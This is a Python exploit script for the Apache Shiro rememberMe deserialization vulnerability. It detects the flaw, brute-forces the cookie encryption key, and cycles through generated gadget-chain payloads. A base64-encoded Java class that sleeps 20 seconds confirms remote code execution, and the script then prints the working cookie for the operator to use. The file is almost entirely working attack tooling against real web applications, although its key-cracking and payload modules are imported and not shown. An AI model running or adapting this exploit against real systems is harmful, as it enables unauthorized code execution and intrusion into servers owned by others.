#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2020/9/10 10:51 上午
# @Author  : Veraxy
# @FileName: Main.py
# @Software: PyCharm
import requests
from urllib import parse, request
from Shiro import Key, GenPayload
import sys

'''请求工具方法'''
def RequestUtils(url,data,rememberMe):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:80.0) Gecko/20100101 Firefox/80.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Cookie': rememberMe,
        'Content-Length': '14',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = parse.urlencode(data).encode('utf-8')
    req = requests.post(url, data=data, headers=headers)
    return req

'''判断存在利用点'''
def JudgeExist(url):
    data = {"classData": "111"}
    rememberMe = 'rememberMe=1'
    if (RequestUtils(url,data,rememberMe).headers['Set-Cookie'].__contains__('rememberMe=deleteMe')):
        print('---发现可利用漏洞点---')
        return True
    else:
        print('---无利用点---')
        return False

'''Sleep探测'''
def SleepTest(url,chain,version,payload):
    data = {"c": "yv66vgAAADQAHgoACAASBQAAAAAAAE4gCgATABQKABMAFQcAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHABYBAApTb3VyY2VGaWxlAQAOU2xlZXBUZXN0LmphdmEMAAkACgcAGQwAGgAbDAAcAB0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAUY29tL3ZlcmF4eS9TbGVlcFRlc3QBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEABXNsZWVwAQAEKEopVgAhAAcACAAAAAAAAgABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAIACAANAAoAAQALAAAATgACAAIAAAARFAACP7gABFceuAAFpwAES7EAAQAAAAwADwAGAAIADAAAABYABQAAAAUABAAGAAwACAAPAAcAEAAJAA4AAAAHAAJPBwAPAAABABAAAAACABE="}
    # for p in payloads:
    rememberMe = 'rememberMe ='+payload
    RequestUtils(url,data,rememberMe)
    if RequestUtils(url,data,rememberMe).elapsed.total_seconds() >= 20.000000:
        print('目标存在利用链'+chain+'，payload生成基于'+version+'版本')
        print('请将以下字段复制至Header头Cookie字段：')
        print('rememberMe='+payload)

if __name__ == '__main__':
    url = sys.argv[1]
    # url = "http://127.0.0.1:7770/admin/213"
    # poc
    if JudgeExist(url) == True:
        # 爆破key
        key = Key.encode_rememberme(url)
        # 遍历字节码
        for dir in GenPayload.Getdir():
            # 生成payload
            payload = GenPayload.Genpayload(dir, key)
            tmp = dir[dir.rfind("/") + 1:]
            tmp_list = tmp.split("-")
            chain = tmp_list[0]
            version = tmp_list[1]
            print('利用链探测中...请稍等...')
            res = SleepTest(url,chain,version,payload)
    else:
        print('探测结束')